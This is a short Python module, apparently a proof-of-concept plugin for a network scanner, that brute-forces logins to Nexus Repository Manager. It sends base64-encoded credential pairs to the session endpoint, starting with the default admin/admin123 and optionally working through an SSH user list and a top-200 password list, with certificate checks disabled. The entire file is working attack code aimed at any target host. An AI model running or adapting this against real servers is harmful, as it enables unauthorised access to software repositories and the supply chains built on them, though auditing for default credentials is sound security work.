# coding: utf-8
# @Time    : 2020/9/21 7:43
# @Author    : WANSUIYE
# @File    : NexusCheck.py
# @Project: kscan_pocs

import requests
import base64

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):
	if flag == 1:
		user_list = ['admin']
		passwd_list = ['admin123']
	else:
		user_list = get_var_items('ssh_user.txt')
		user_list.add('admin')
		passwd_list = get_var_items('top200passwd.txt')
		passwd_list.add('admin123')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	url = '{}://{}:{}/service/rapture/session'.format(target[0], target[1], int(target[2]))
	retVal=''
	try:
		data = {'username': base64.b64encode(user.encode()), 'password': base64.b64encode(passwd.encode())}
		res = requests.post(url, data=data, verify=False, timeout=timeout)
		if res.status_code == 204:
			retVal = '{}/{}'.format(user,passwd)
	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'Nexus','status':1,'url':''}

	for user, passwd in get_dict(flag):
		res = bf(target,user,passwd,timeout)
		if res:
			retVal['status'] = 2
			retVal['url'] += res+'\n'

	return retVal